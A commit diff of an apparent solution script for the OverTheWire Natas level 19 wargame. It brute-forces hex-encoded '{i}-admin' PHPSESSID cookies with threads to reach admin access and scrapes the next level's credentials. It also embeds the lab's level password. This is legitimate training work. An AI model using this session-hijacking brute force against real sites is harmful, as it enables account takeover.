b3f77d665bded11fd4eca26e484814e7593c6189
d4y5kulll88 <148268845+d4y5kulll88@users.noreply.github.com>
2024-01-14 14:51:45 +0530

    Update Natas 19.py

--- Natas 19.py
+++ Natas 19.py
@@ -5,48 +5,50 @@ import re
 import threading
 import requests
 import colorama
-from bs4 import BeautifulSoup
 from colorama import Fore, Style
 
 
 def sessionIdBruteforce(i):
-    id = binascii.hexlify(f"{i}-admin".encode()).decode()
-    resp = session.get(url=url, cookies={"PHPSESSID": id})
+    session_id = binascii.hexlify(f"{i}-admin".encode()).decode()
+    resp = session.get(url=url, cookies={"PHPSESSID": session_id})
 
     if "You are an admin" in resp.text:
-        soup = BeautifulSoup(resp.text, 'lxml')
-        print(i)
-        print(re.sub("View sourcecode", "", soup.div.text))
-    else:
-        print(f"[-] Brute forcing PHPSESSID: {i}")
+        natas20_username = re.search("Username: (.*)", resp.text).group(1)
+        natas20_password = re.search("Password: (.*)</pre>", resp.text).group(1)
+
+        print(f"\n[+] {natas20_username}: {natas20_password}")
 
 
 # Initialize colorama for colored console output
 colorama.init(autoreset=False)
 print(Fore.LIGHTBLUE_EX, Style.BRIGHT)
 
+
 # Set the username and password for authentication
 username = 'natas19'
 password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'
 
+
 # Construct the URL using the given username
 url = f'http://{username}.natas.labs.overthewire.org/'
+
 
 # Create a session and set the authorization credentials
 session = requests.Session()
 
+
 # Set the authorization credentials using HTTP Basic Auth
 session.auth = (username, password)
 
-# Empty Thread lists
+
+# Empty Threads list
 threads = []
 
 
-for i in range(1, 500):
-    sessionIdBruteforce(i)
-    # thread = threading.Thread(target=sessionIdBruteforce, args=(i,))
-    # thread.start()
-    # threads.append(thread)
+for i in range(1, 641):
+    thread = threading.Thread(target=sessionIdBruteforce, args=(i,))
+    thread.start()
+    threads.append(thread)
 
 
 # Wait for all threads to finish
